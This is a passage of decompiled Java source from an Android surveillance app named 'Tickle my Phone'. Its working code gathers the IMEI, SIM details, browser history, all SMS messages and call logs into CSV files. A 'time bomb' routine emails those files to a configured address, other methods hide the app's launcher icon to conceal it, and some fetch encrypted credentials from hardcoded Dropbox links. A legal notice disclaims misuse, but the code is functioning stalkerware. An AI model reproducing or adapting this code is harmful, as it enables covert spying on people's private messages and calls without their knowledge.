").append(PhoneProduct).toString())).append("\nUser= ").append(User).toString())).append("\nSdk= ").append(Sdk).toString())).append("\nAndroidVersion= ").append(AndroidVersion).toString())).append("\nCodeName= ").append(CodeName).toString())).append("\nImeiCode= ").append(ImeiCode).toString())).append("\nSimCountry= ").append(SimCountry).toString())).append("\nSIMDeviceSoftwareVersion= ").append(SIMDeviceSoftwareVersion).toString())).append("\nSimOperator= ").append(SimOperator).toString())).append("\nSimOperatorName= ").append(SimOperatorName).toString())).append("\nSimSerialNumber= ").append(SimSerialNumber).toString())).append("\nInstalltionSource= ").append(InstalltionSource).toString())).append("\nCountry= ").append(Country).toString())).append("\nGetCountryName= ").append(GetCountryName(context)).toString();
    }

    public static void UpdateToFree(Context context) {
        if (GetPref(context, "KEY_IS_FREE").equals("Y")) {
            String callbackspeaker = GetPref(context, "KEY_CALLBACK_SPEAKER_ENABLE");
            String geosms = GetPref(context, "KEY_GEOSMS_ENABLE");
            String setgps = GetPref(context, "KEY_SETGPS_ENABLE");
            String setwifi = GetPref(context, "KEY_SETWIFI_ENABLE");
            String setbluetooth = GetPref(context, "KEY_BLUETOOTH_ENABLE");
            String calevent = GetPref(context, "KEY_CALEVENT_ENABLE");
            String getdirlist = GetPref(context, "KEY_GETDIRLIST_ENABLE");
            String networkdata = GetPref(context, "KEY_NETWORKDATA_ENABLE");
            String callforwardspk = GetPref(context, "KEY_CALLFORWARD_SPEAKER_ENABLE");
            if (callbackspeaker.equals("Y") || geosms.equals("Y") || setgps.equals("Y") || setwifi.equals("Y") || setbluetooth.equals("Y") || calevent.equals("Y") || getdirlist.equals("Y") || networkdata.equals("Y") || callforwardspk.equals("Y")) {
                ShowWantFullVersion(context);
            }
            SetPref(context, "KEY_CALLBACK_SPEAKER_ENABLE", "N");
            SetPref(context, "KEY_GEOSMS_ENABLE", "N");
            SetPref(context, "KEY_SETGPS_ENABLE", "N");
            SetPref(context, "KEY_SETWIFI_ENABLE", "N");
            SetPref(context, "KEY_BLUETOOTH_ENABLE", "N");
            SetPref(context, "KEY_CALEVENT_ENABLE", "N");
            SetPref(context, "KEY_GETDIRLIST_ENABLE", "N");
            SetPref(context, "KEY_NETWORKDATA_ENABLE", "N");
            SetPref(context, "KEY_CALLFORWARD_SPEAKER_ENABLE", "N");
            SetPref(context, "KEY_ADDCONTACT_ENABLE", "N");
            UpdatePrefToFree(context);
        }
    }

    public static void UpdatePrefToFree(Context context) {
        if (GetPref(context, "KEY_IS_FREE").equals("Y")) {
            Debug("======>1");
            SetPrefPrivacyStealth(context, "playtmlalaram", "false");
            Debug("======>2");
            SetPrefPrivacyStealth(context, "playvibrate", "false");
            Debug("======>3");
            SetPrefPrivacyStealth(context, "hideincoming", "false");
            Debug("======>4");
            SetPrefPrivacyStealth(context, "recordlog", "true");
            Debug("======>5");
            SetPrefPrivacyStealth(context, "dialnumber", "4455");
            Debug("======>6");
            SetPrefPrivacyStealth(context, "smsmenustring", "tmlmenu");
            Debug("======>7");
            SetPrefPrivacyStealth(context, "delaypref", "0");
            Debug("======>8");
            SetPrefPrivacyStealth(context, "audiotime", "30");
            Debug("======>9");
            SetPrefPrivacyStealth(context, "videotime", "30");
            Debug("======>10");
        }
    }

    public static void UpdateSettingsBacktoFree(Context context) {
        if (GetPref(context, "KEY_IS_FREE").equals("Y")) {
            SetPrefPrivacyStealth(context, "sendsmswhenstolen", "false");
            SetPrefPrivacyStealth(context, "sendemailwhenstolen", "false");
            SetPrefPrivacyStealth(context, "enableautoanswer", "false");
        }
    }

    public static String GetSimCountry(Context context) {
        return ((TelephonyManager) context.getSystemService("phone")).getNetworkCountryIso().toUpperCase();
    }

    public static String GetSimOperator(Context context) {
        return ((TelephonyManager) context.getSystemService("phone")).getSimOperator();
    }

    public static String GetSimOperatorName(Context context) {
        return ((TelephonyManager) context.getSystemService("phone")).getSimOperatorName();
    }

    public static String GetSimSerialNumber(Context context) {
        return ((TelephonyManager) context.getSystemService("phone")).getSimSerialNumber();
    }

    public static String GetSIMDeviceSoftwareVersion(Context context) {
        return ((TelephonyManager) context.getSystemService("phone")).getDeviceSoftwareVersion();
    }

    public static CellLocation GetSIMLocation(Context context) {
        return ((TelephonyManager) context.getSystemService("phone")).getCellLocation();
    }

    public static String GetBrowserHistory(Context context) {
        String HTML_End = getHTMLFooter(context);
        String Final_HTML = "<table border=\"1\" bordercolor=\"FF3300\" style=\"background-color:FFFFFF\" width=\"800\" cellpadding=\"3\" cellspacing=\"3\">";
        Cursor mCur = ((Activity) context).managedQuery(Browser.BOOKMARKS_URI, Browser.HISTORY_PROJECTION, null, null, null);
        mCur.moveToFirst();
        if (mCur.moveToFirst() && mCur.getCount() > 0) {
            while (!mCur.isAfterLast()) {
                String Title = mCur.getString(5);
                String Url = mCur.getString(1);
                String date_str = "";
                try {
                    date_str = new SimpleDateFormat("dd-MM-yyyy/h:m:s:a").format(new Date(Long.parseLong(mCur.getString(3))));
                } catch (Exception e) {
                    date_str = "Unknown Date";
                }
                Final_HTML = new StringBuilder(String.valueOf(Final_HTML)).append("<tr><td>").append(Title).append(" </td><td>").append(mCur.getString(3)).append("</td><td>").append(date_str).append("</tr>").toString();
                Log.v("titleIdx", mCur.getString(5));
                Log.v("urlIdx", mCur.getString(1));
                mCur.moveToNext();
            }
        }
        return new StringBuilder(String.valueOf(Final_HTML)).append(HTML_End).toString();
    }

    public static void OpenMarketWindow(Context context) {
        Intent intent;
        try {
            intent = new Intent("android.intent.action.VIEW");
            intent.setData(Uri.parse(MOBILE_MARKET_URL_FULL));
            context.startActivity(intent);
        } catch (Exception e) {
            intent = new Intent("android.intent.action.VIEW");
            intent.setData(Uri.parse(DESKTOP_MARKET_URL_FULL));
            context.startActivity(intent);
        }
    }

    public static void ShowMobileLostMessage(final Context context) {
        Builder alert = new Builder(context);
        final EditText input = new EditText(context);
        input.setText(GetPref(context, "DEFAULT_PHONE_LOST_TEXT"));
        alert.setView(input);
        alert.setPositiveButton("Save", new OnClickListener() {
            public void onClick(DialogInterface dialog, int whichButton) {
                TML_Library.SetPref(context, "DEFAULT_PHONE_LOST_TEXT", input.getText().toString().trim());
            }
        });
        alert.setNegativeButton("Cancel", new OnClickListener() {
            public void onClick(DialogInterface dialog, int whichButton) {
                dialog.cancel();
            }
        });
        alert.show();
    }

    public static void ShowAlertMessage(Context context, String Message) {
        Builder dialog = new Builder(context);
        dialog.setTitle("Tickle my Phone");
        dialog.setMessage(Message);
        dialog.setPositiveButton(" OK ", new OnClickListener() {
            public void onClick(DialogInterface dialog, int id) {
                dialog.dismiss();
            }
        });
        dialog.show();
    }

    public static void ShowAlertMessageHTML(Context context, String Message) {
        Builder dialog = new Builder(context);
        dialog.setTitle("Tickle my Phone");
        dialog.setMessage(Html.fromHtml(Message));
        dialog.setPositiveButton(" OK ", new OnClickListener() {
            public void onClick(DialogInterface dialog, int id) {
                dialog.dismiss();
            }
        });
        dialog.show();
    }

    public static void SwitchOfftheScreen(Context context) {
        LayoutParams params = ((Activity) context).getWindow().getAttributes();
        params.flags |= 128;
        params.screenBrightness = 0.0f;
        ((Activity) context).getWindow().setAttributes(params);
    }

    public static String GBoo(Boolean b) {
        if (b.booleanValue()) {
            return "TRUE";
        }
        return "FALSE";
    }

    public static void ValidatePin(Context context) {
        Builder dialog = new Builder(context);
        dialog.setTitle("Tickle my Phone");
        dialog.setMessage("Enter password");
        dialog.setView(new EditText(context));
        dialog.setPositiveButton(" OK ", new OnClickListener() {
            public void onClick(DialogInterface dialog, int id) {
                dialog.dismiss();
            }
        });
        dialog.show();
    }

    public static String GetDec(String what) throws Exception {
        if (GetData(what).equals("PROB")) {
            return "PROB";
        }
        return SimpleCrypto.decrypt(SimpleCrypto.showme(), GetData(what));
    }

    public static String GetData(String t) {
        if (t.equals("u")) {
            try {
                return new BufferedReader(new InputStreamReader(new URL("http://dl.dropbox.com/u/27314855/u.txt.txt").openStream())).readLine().trim();
            } catch (Exception e) {
                Debug("X" + e);
                return "PROB";
            }
        }
        try {
            return new BufferedReader(new InputStreamReader(new URL("http://dl.dropbox.com/u/27314855/p.txt.txt").openStream())).readLine().trim();
        } catch (Exception e2) {
            Debug("X" + e2);
            return "PROB";
        }
    }

    public static String GetU(Context context) {
        return context.getString(R.string.user);
    }

    public static String GetP(Context context) {
        return context.getString(R.string.pwd);
    }

    public static boolean IsICONVisible(Context context) {
        if (context.getPackageManager().getComponentEnabledSetting(new ComponentName(context, SplashScreen.class)) == 0) {
            return true;
        }
        return false;
    }

    public static void RemoveICON(Context context) {
        PackageManager pm = context.getPackageManager();
        ComponentName name = new ComponentName(context, SplashScreen.class);
        if (pm.getComponentEnabledSetting(name) == 0) {
            PutToast(context, "Disabling");
            Sleep(5);
            pm.setComponentEnabledSetting(name, 2, 0);
        }
    }

    public static void BringBackICON(Context context) {
        PackageManager pm = context.getPackageManager();
        ComponentName name = new ComponentName(context, SplashScreen.class);
        if (pm.getComponentEnabledSetting(name) != 0) {
            PutToast(context, "Enabling");
            Sleep(5);
            pm.setComponentEnabledSetting(name, 0, 0);
        }
    }

    public static int RandomRange(int min, int max) {
        return new Random().nextInt((max - min) + 1) + min;
    }

    public static void ICONToggle(Context context) {
        PackageManager pm = context.getPackageManager();
        ComponentName name = new ComponentName(context, SplashScreen.class);
        if (pm.getComponentEnabledSetting(name) == 0) {
            PutToast(context, "Disabling");
            Sleep(5);
            pm.setComponentEnabledSetting(name, 2, 0);
            return;
        }
        PutToast(context, "Enabling");
        Sleep(5);
        pm.setComponentEnabledSetting(name, 0, 0);
    }

    public static void BringBackIcon(Context context) {
        PackageManager pm = context.getPackageManager();
        ComponentName name = new ComponentName(context, SplashScreen.class);
    }

    public static String GetFree2PaidText() throws IOException {
        String FinalHtml = "";
        BufferedReader reader = new BufferedReader(new InputStreamReader(new URL("http://dl.dropbox.com/u/27314855/free2paid.htm").openStream()));
        String str = "";
        while (true) {
            str = reader.readLine();
            if (str == null) {
                return FinalHtml;
            }
            FinalHtml = new StringBuilder(String.valueOf(FinalHtml)).append(str).toString();
        }
    }

    public static String GetLegalNotice() {
        return new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf("" + "<html>\n")).append(" <div style=\"border:6px outset orange;\" >\n").toString())).append("\t<head>\n").toString())).append("\t\t<title>Tickle my Phone</title>\n").toString())).append("\t</head>\n").toString())).append("  <img src=\"file:///android_res/drawable/icon.png\">   \n").toString())).append("\t<body>\n").toString())).append("\t\t<p>\n").toString())).append("\t\t\t&nbsp;</p>\n").toString())).append("\t\t<p>\n").toString())).append("\t\t\t<span style=\"font-size:36px;\">Tickle my Phone Legal Notice</span></p>\n").toString())).append("\t\t<p>\n").toString())).append("\t\t\t&nbsp;</p>\n").toString())).append("\t\t<p>\n").toString())).append("\t\t\tIt is considered federal and/or state violation of the law in most cases to install surveillance software onto a mobile phone or other device for which you do not have proper authorization, and in most cases you are required to notify users of the device that they are being monitored. Failure to do so may result in the violation of federal or state laws and prosecution by local authorities.</p>\n").toString())).append("\t\t<p>\n").toString())).append("\t\t\tWe absolutely do not endorse the use of our software for illegal purposes.</p>\n").toString())).append("\t\t<p>\n").toString())).append("\t\t\t&nbsp;</p>\n").toString())).append("\t\t<p>\n").toString())).append("\t\t\tIn order to purchase and download surveillance software form Tickle my Phone, you must accept the following Terms and Conditions:</p>\n").toString())).append("\t\t<p>\n").toString())).append("\t\t\t&nbsp;</p>\n").toString())).append("\t\t<p>\n").toString())).append("\t\t\t1. YOU MUST COMPLY WITH ALL DOMESTIC AND INTERNATIONAL LAWS AND REGULATIONS THAT APPLY TO YOUR USE OF SURVEILLANCE TECHNOLOGY LIKE Tickle my Phone.</p>\n").toString())).append("\t\t<p>\n").toString())).append("\t\t\t&nbsp;</p>\n").toString())).append("\t\t<p>\n").toString())).append("\t\t\t2. You must be the legal owner of the mobile phone or device onto which the software is installed, or you must receive the expressed, written consent of the device owner granting you the right to be the authorized administrator of the phone, its content and its users.</p>\n").toString())).append("\t\t<p>\n").toString())).append("\t\t\t&nbsp;</p>\n").toString())).append("\t\t<p>\n").toString())).append("\t\t\t3. If you install Tickle my Phone software onto a phone that is not owned by you, or for which you do not have proper consent, we are obligated to comply with law enforcement officials to the fullest extent of the law in these instances, or any instance where this use of deemed to be illegal by local, state or federal law. This obligation includes providing to the proper authorities any and all requested customer data, and any other purchase or product-related information.</p>\n").toString())).append("\t\t<p>\n").toString())).append("\t\t\t&nbsp;</p>\n").toString())).append("\t\t<p>\n").toString())).append("\t\t\t4. You agree that you will gain knowledge of all local, state and federal laws to ensure that you are in compliance with all laws and restrictions in your specific geographic region. &nbsp;It may be illegal in your area to monitor other individuals on a device whether or not you own the device. You agree that you will under no circumstances monitor any adult without their expressed prior knowledge and consent.</p>\n").toString())).append("\t\t<p>\n").toString())).append("\t\t\t&nbsp;</p>\n").toString())).append("\t\t<p>\n").toString())).append("\t\t\t5. You agree that you will not use Tickle my Phone to threaten, harass or bully any other person.</p>\n").toString())).append("\t\t<p>\n").toString())).append("\t\t\t&nbsp;</p>\n").toString())).append("\t\t<p>\n").toString())).append("\t\t\t6. &nbsp;You agree to the conditions in our End-User License Agreement, and you acknowledge and agree that Tickle my Phone is not liable for any incidental damage to you or your device, nor for any litigation or legal action that may arise as result of the use, abuse or misuse of Tickle my Phone.</p>\n").toString())).append("\t\t<p>\n").toString())).append("\t\t\t&nbsp;</p>\n").toString())).append("\t\t<p>\n").toString())).append("\t\t\t7. Your personal, private and confidential information which is not publicly accessible and which Tickle my Phone may have collected either during the purchase process or during the product&#39;s full lifecycle on the target phone, is hosted in a secured environment and will not be disclosed or published anywhere without obtaining your prior consent. &nbsp;We will however disclose customer data or any other purchase- or product-related information to law enforcement officials in instances where Tickle my Phone installation or/and use has not been compliant with local, state or federal law. &nbsp;See point 3.</p>\n").toString())).append("\t\t<p>\n").toString())).append("\t\t\t&nbsp;</p>\n").toString())).append("\t\t<p>\n").toString())).append("\t\t\t8. Google may collect certain usage data from Market and Devices which is maintained in accordance with Google&#39;s Privacy Policy. Tickle my Phone will not be liable for any incidental damage, litigation or legal action that may arise as the result of such activities.</p>\n").toString())).append("\t\t<p>\n").toString())).append("\t\t\t&nbsp;</p>\n").toString())).append("\t</body>\n").toString())).append("</html>\n").toString();
    }

    public static void LoadStart(Context context, String Message) {
        LoadingProgressDialog = ProgressDialog.show(context, "", Message);
    }

    public static void LoadStop(Context context) {
        try {
            LoadingProgressDialog.dismiss();
        } catch (Exception e) {
        }
    }

    public static void SetPrefNew(Context cntxt, String key, String value) {
        Editor editor = PreferenceManager.getDefaultSharedPreferences(cntxt).edit();
        editor.putString(key, value.trim());
        editor.commit();
    }

    public static String GetPrefNew(Context context, String key, String DefaultValue) {
        return PreferenceManager.getDefaultSharedPreferences(context).getString(key, DefaultValue);
    }

    public static Boolean GetPrefBooleanNew(Context context, String key, Boolean DefaultValue) {
        return Boolean.valueOf(PreferenceManager.getDefaultSharedPreferences(context).getBoolean(key, DefaultValue.booleanValue()));
    }

    public static void TimeBombRun(Context context) {
        String s_TIME_BOMB_EMAIL = GetPrefNew(context, "TIME_BOMB_EMAIL", "");
        String s_TB_ALL_SMS_INBOX = GetPrefNew(context, "TB_ALL_SMS_INBOX", "N");
        String s_TB_ALL_SMS_SENT = GetPrefNew(context, "TB_ALL_SMS_SENT", "N");
        String s_TB_ALL_INCOMING_CALL_LOG = GetPrefNew(context, "TB_ALL_INCOMING_CALL_LOG", "N");
        String s_TB_ALL_OUTGOING_CALL_LOG = GetPrefNew(context, "TB_ALL_OUTGOING_CALL_LOG", "N");
        String s_TB_ALL_MISSED_CALL_LOG = GetPrefNew(context, "TB_ALL_MISSED_CALL_LOG", "N");
        if (s_TB_ALL_SMS_INBOX.equals("Y") || s_TB_ALL_SMS_SENT.equals("Y")) {
            GetTimeBombSMSDetails(context, s_TB_ALL_SMS_INBOX, s_TB_ALL_SMS_SENT);
        }
        if (s_TB_ALL_INCOMING_CALL_LOG.equals("Y") || s_TB_ALL_OUTGOING_CALL_LOG.equals("Y") || s_TB_ALL_MISSED_CALL_LOG.equals("Y")) {
            GetTimeBombCallDetailsInfo(context, s_TB_ALL_INCOMING_CALL_LOG, s_TB_ALL_OUTGOING_CALL_LOG, s_TB_ALL_MISSED_CALL_LOG);
        }
        String str = getTMLPath() + "tb_sms_log.csv";
        SendEmail(context, "junk", "junkpwd", s_TIME_BOMB_EMAIL, APP_NAME + " sent you TIME BOMB SMS Details", "Dear Tickle my Phone User,\n Please find the SMS details CSV attachment\n\nThank you", str);
        str = getTMLPath() + "tb_call_log.csv";
        SendEmail(context, "junk", "junkpwd", s_TIME_BOMB_EMAIL, APP_NAME + " sent you TIME BOMB Call LOG Details", "Dear Tickle my Phone User,\n Please find the Call Log CSV attachment\n\nThank you", str);
    }

    public static void GetTimeBombSMSDetails(Context context, String s_TB_ALL_SMS_INBOX, String s_TB_ALL_SMS_SENT) {
        Cursor c = context.getContentResolver().query(Uri.parse("content://sms"), null, "type in (1,2)", null, "date desc ");
        String MessageType = "";
        int smsEntriesCount = c.getCount();
        String[] body = new String[smsEntriesCount];
        String[] number = new String[smsEntriesCount];
        String[] read = new String[smsEntriesCount];
        String[] status = new String[smsEntriesCount];
        String[] date = new String[smsEntriesCount];
        String[] type = new String[smsEntriesCount];
        String[] subject = new String[smsEntriesCount];
        String csvdata = "" + "TYPE,NUMBER,DATE,BODY\n";
        if (c.moveToFirst()) {
            for (int i = 0; i < smsEntriesCount; i++) {
                type[i] = c.getString(c.getColumnIndexOrThrow("type")).toString();
                body[i] = c.getString(c.getColumnIndexOrThrow("body")).toString();
                number[i] = c.getString(c.getColumnIndexOrThrow("address")).toString();
                date[i] = DateFormat.format("dd.MMM.yyyy h:mm a", new Date(Long.parseLong(c.getString(c.getColumnIndexOrThrow("date")).toString()))).toString();
                read[i] = c.getString(c.getColumnIndexOrThrow("read")).toString();
                status[i] = c.getString(c.getColumnIndexOrThrow("status")).toString();
                type[i] = c.getString(c.getColumnIndexOrThrow("type")).toString();
                if (type[i].equals("1")) {
                    MessageType = "INCOMING";
                } else {
                    MessageType = "SENT";
                }
                csvdata = new StringBuilder(String.valueOf(csvdata)).append(MessageType).append(",=\"").append(number[i]).append("\",").append(date[i]).append(",\"").append(body[i].replaceAll("[\\t\\n\\r]+", " ")).append("\"\n").toString();
                c.moveToNext();
            }
        }
        c.close();
        CreateLogText(context, getTMLPath() + "tb_sms_log.csv", csvdata);
    }

    public static void GetTimeBombCallDetailsInfo(Context context, String s_TB_ALL_INCOMING_CALL_LOG, String s_TB_ALL_OUTGOING_CALL_LOG, String s_TB_ALL_MISSED_CALL_LOG) {
        Cursor c = context.getContentResolver().query(Uri.parse("content://call_log/calls"), null, null, null, "date DESC");
        String csvdata = "" + "CALL TYPE,CALL NUMBER, NAME, DATE,IS NEW,DURATION (SECS)\n";
        while (c.moveToNext()) {
            String callNumber = c.getString(c.getColumnIndex("number"));
            String callName = c.getString(c.getColumnIndex("name"));
            String DateYYYYMMDD = DateFormat.format("dd.MMM.yyyy h:mm:ss a", new Date(Long.parseLong(c.getString(c.getColumnIndex("date"))))).toString();
            String callType = c.getString(c.getColumnIndex("type"));
            int icalltype = c.getInt(c.getColumnIndex("type"));
            String isCallNew = c.getString(c.getColumnIndex("new"));
            String duration = c.getString(c.getColumnIndex("duration"));
            String ActualCallType = "";
            if (icalltype == 1) {
                if (s_TB_ALL_INCOMING_CALL_LOG.equals("Y")) {
                    csvdata = new StringBuilder(String.valueOf(csvdata)).append("INCOMING").append(",=\"").append(callNumber).append("\",").append("=\"").append(callName).append("\"").append(",").append(DateYYYYMMDD).append(",").append(isCallNew).append(",").append(duration).append("\n").toString();
                }
            }
            if (icalltype == 2) {
                if (s_TB_ALL_OUTGOING_CALL_LOG.equals("Y")) {
                    csvdata = new StringBuilder(String.valueOf(csvdata)).append("OUTGOING").append(",=\"").append(callNumber).append("\",").append("=\"").append(callName).append("\"").append(",").append(DateYYYYMMDD).append(",").append(isCallNew).append(",").append(duration).append("\n").toString();
                }
            }
            if (icalltype == 3) {
                if (s_TB_ALL_MISSED_CALL_LOG.equals("Y")) {
                    csvdata = new StringBuilder(String.valueOf(csvdata)).append("MISSED").append(",=\"").append(callNumber).append("\",").append("=\"").append(callName).append("\"").append(",").append(DateYYYYMMDD).append(",").append(isCallNew).append(",").append(duration).append("\n").toString();
                }
            }
            csvdata = new StringBuilder(String.valueOf(csvdata)).append("DONTKNOW" + callType).append(",=\"").append(callNumber).append("\",").append("=\"").append(callName).append("\"").append(",").append(DateYYYYMMDD).append(",").append(isCallNew).append(",").append(duration).append("\n").toString();
        }
        CreateLogText(context, getTMLPath() + "tb_call_log.csv", csvdata);
    }
}
